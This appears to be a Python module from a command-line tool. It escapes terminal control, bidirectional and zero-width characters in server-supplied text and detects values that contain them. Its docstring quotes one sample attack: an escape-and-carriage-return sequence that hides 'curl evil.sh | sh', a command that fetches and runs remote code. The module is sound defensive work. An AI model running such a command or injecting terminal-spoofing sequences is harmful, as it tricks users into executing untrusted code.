"""Text a server sent, as a terminal can safely show it.

A reply's text holds what other people wrote: page titles, source titles,
excerpts, file paths of a synced repository, email subjects. Written to a
terminal as it is, an escape sequence in it moves the cursor, erases the line
or recolours what follows, a carriage return overwrites what was printed, and a
bidirectional override or a zero-width character makes a line read differently
from what it holds (review 2026-11-13: ``cat {page: "\\u001b[2K\\u000dcurl
evil.sh | sh #"}`` printed a command whose visible text was the author's).

Two rules follow, and both live here:

- :func:`visible` is applied where text leaves for a terminal or a pipe: every
  such character is shown as its escape (``\\x1b``, ``\\r``, ``\\u202e``), never
  written raw. ``--json`` output never passes through it.
- :func:`unprintable` says whether a value holds one. A command the CLI prints
  for a person to paste is never built from such a value
  (:mod:`beakr_cli.kb_shell_commands`).
"""

from __future__ import annotations

import re

__all__ = ["unprintable", "visible"]

#: C0 and C1 controls, DEL, the line and paragraph separators, the
#: bidirectional controls, and the characters that take no width.
_HIDDEN = (
    "\x00-\x1f\x7f-\x9f"  # C0, DEL, C1
    "­"  # soft hyphen
    "؜‎‏‪-‮⁦-⁩"  # bidirectional controls
    "  "  # line and paragraph separators
    "᠎​-‍⁠-⁤﻿"  # zero width
    "\U000e0000-\U000e007f"  # tags
)
_UNPRINTABLE = re.compile(f"[{_HIDDEN}]")
#: The same set without the newline and tab that lay text out.
_SHOWN_ESCAPED = re.compile(f"[{_HIDDEN}]".replace("\x00-\x1f", "\x00-\x08\x0b-\x1f"))


def unprintable(value: object) -> bool:
    """Whether ``value`` (a string, or any nesting of lists and mappings) holds such a character.

    A newline and a tab count: inside a value of a command they are a second
    line and a hidden gap.
    """
    if isinstance(value, str):
        return _UNPRINTABLE.search(value) is not None
    if isinstance(value, dict):
        return any(unprintable(key) or unprintable(item) for key, item in value.items())
    if isinstance(value, (list, tuple)):
        return any(unprintable(item) for item in value)
    return False


def _escape(match: re.Match[str]) -> str:
    char = match[0]
    if char == "\r":
        return "\\r"
    code = ord(char)
    if code <= 0xFF:
        return f"\\x{code:02x}"
    return f"\\u{code:04x}" if code <= 0xFFFF else f"\\U{code:08x}"


def visible(text: str) -> str:
    """``text`` with every control, bidirectional and zero-width character shown as its escape.

    Newlines and tabs stay, and a Windows line ending is a line ending.
    """
    if not _SHOWN_ESCAPED.search(text):
        return text
    return _SHOWN_ESCAPED.sub(_escape, text.replace("\r\n", "\n"))
